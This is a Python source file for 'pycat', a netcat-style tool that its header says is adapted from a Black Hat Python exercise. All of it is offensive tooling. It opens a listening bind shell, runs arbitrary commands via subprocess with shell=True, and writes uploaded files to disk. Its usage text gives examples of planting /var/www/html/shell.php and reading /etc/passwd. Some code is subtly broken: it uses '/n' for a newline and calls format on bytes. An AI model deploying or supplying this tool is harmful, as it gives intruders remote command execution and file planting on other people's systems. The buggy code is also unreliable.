#this is not original code, it is an upgraded and python3 converted version of the netcat replacement exercise from Black Hat Python - a book that you should totally check out

import sys
import socket
import getopt
import threading
import subprocess


listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

def usage():
        print ("pycat")
        print ("Usage: this.exe -t target_host -p port")
        print ("-l --listen                - listen on [host]:[port] for incoming connections")
        print ("-e --execute=file_to_run   - execute the given file upon receiving a connection")
        print ("-c --command               - initialize a command shell")
        print ("-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
        print
        print ("Examples: ")
        print ("this.exe -t 10.11.48.80 -p 1337 -l -c")
        print ("this.exe -t 10.11.48.80 -p 1337 -l -u=c:\\target.exe /var/www/html/shell.php")
        print ("this.exe -t 10.11.48.80 -p 1337 -l -e=\"cat /etc/passwd\"")
        print ("echo 'GDAY M8' | ./this.exe -t 10.11.48.80 -p 135")
        sys.exit(0)


def main():
        global listen
        global port
        global execute
        global command
        global upload_destination
        global target
        # print usage if no args
        if not len(sys.argv[1:]):
                usage()
                
        # read the commandline options, our index is saying the first arg will be one of three, second and third are target and port
        # and last is command shell. If we mess any of these up it will handle the error by printing usage
        try:
                opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
        except getopt.GetoptError as err:
                print (str(err))
                usage()
                
        #the below code runs a check to see which flags are specified and sets variables accordingly for further execution
        for o,a in opts:
                if o in ("-h","--help"):
                        usage()
                elif o in ("-l","--listen"):
                        listen = True
                elif o in ("-e", "--execute"):
                        execute = a
                elif o in ("-c", "--commandshell"):
                        command = True
                elif o in ("-u", "--upload"):
                        upload_destination = a
                elif o in ("-t", "--target"):
                        target = a
                elif o in ("-p", "--port"):
                        port = int(a)
                else:
                        assert False,"Unhandled Option"
        

        # if listen flag not specified we send our malcode for execution
        if not listen and len(target) and (port > 0):
                
                # read in the buffer from the commandline
                # this will block, so send CTRL-D if not sending input
                # to stdin
                buffer = input() + '/n'
                #buffer = sys.stdin.read()
                
                # send data off
                client_sender(buffer)   
        
        # we are going to listen and potentially 
        # upload things, execute commands and drop a shell back
        # depending on our command line options above
        if listen:
                server_loop()
   


# below function used in lieu of being a listener, we establish ourselves as a TCP client
def client_sender(buffer):
        
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
        try:
                # reach out to host
                client.connect((target,port))
                client.settimeout(30)               
                # if we detect input from stdin we send our buffer, if not see exception.
                if len(buffer) !=0:
                        client.send(buffer.encode())

                # we loop while recieving data, when there is not left we break the loop and print the response variable which we add to each loop
                while True:
                                                
                        recv_len = 1
                        response = ""
                        
                        while recv_len:
                                data     = client.recv(4096).decode("utf-8")
                                recv_len = len(data)
                                response += data
                                
                                if recv_len < 4096:
                                        break
                        
                        print(response+"\n") 
                        
                        
                        buffer = input()
                        buffer += "\n"
                        
                        client.send(buffer.encode())
                        
        #in the case of an error, we print it and then close connection (eg when we ^c to escape or connection drops)       
        except Exception as err:
                
                print ("[*] Sumting wong... {}".format(err))
                                 
                client.close()  
                        
# our listener
def server_loop():
        global target

        
        # if just the listen flag is specified we listen on all
        if not len(target):
                target = "0.0.0.0"
                
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target,port))
        
        # backlog of 5 incoming requests
        server.listen(5)
        print ("[***] listening on {} {} [***] ".format(target,port))
        
        while True:
                client_socket, addr = server.accept()
                #print ("[\U0001F640] accepted connection from {} {}".format(target,port))
                try:
                # # here we make use of the threading module, we create a new thread for our connecting client AKA your revshell
                        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
                        client_thread.start()
                except Exception as e:
                        print(e)

# this runs a command and returns the output
def run_command(command):
        
        # trim the newline
        command = command.rstrip()

        # below we run whichever command we punch inm returning the output from target OS
        # we utilise the subproccess thread, this creates a process for your command and will return the output
        # stderr= subprocess.STDOUT catches errors and puts it into output
        try:
                output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
        # here we simply catch generic errors
        except:
                output = ("Failed to execute command.\r\n")
        
        # send the output back to the client
        return output

  
# this handles incoming client connections
def client_handler(client_socket):
        global execute
        global command
        
        # check in upload var (previously populated with the -u --upload flag)
        if len(upload_destination):
                
                # read in all of the bytes and write to our destination
                file_buffer = ""
                
                # keep reading data until none is available
                while True:
                        data = client_socket.recv(1024).decode("utf-8")
                        
                        if not data:
                                break
                        else:
                                file_buffer += data
                                
                # now we take these bytes and try to write them out
                try:
                        file_descriptor = open(upload_destination,"wb")
                        file_descriptor.write(file_buffer.encode())
                        file_descriptor.close()
                        
                        # acknowledge that we wrote the file out
                        client_socket.send(b"Successfully saved file to {}\r\n".format(upload_destination))
                except:
                        client_socket.send(b"Failed to save file to {}\r\n".format(upload_destination))
                        
                
        
        # check for command execution
        if len(execute):
                
                # run the command
                output = run_command(execute)
                
                client_socket.send(output.encode())
        
        
        # now we go into another loop if a command shell was requested
        if command:
                
                while True:
                        # show a simple prompt
                        client_socket.send(b"<Shell:#> ")
                        
                        # now we receive until we see a linefeed (enter key)
                        cmd_buffer = ""
                        while "\n" not in cmd_buffer:
                                cmd_buffer = client_socket.recv(1024).decode()
                
                        
                        # we have a valid command so execute it and send back the results
                        response = run_command(cmd_buffer)
                        
                        # send back the response
                        client_socket.send(response.encode())
        

main()

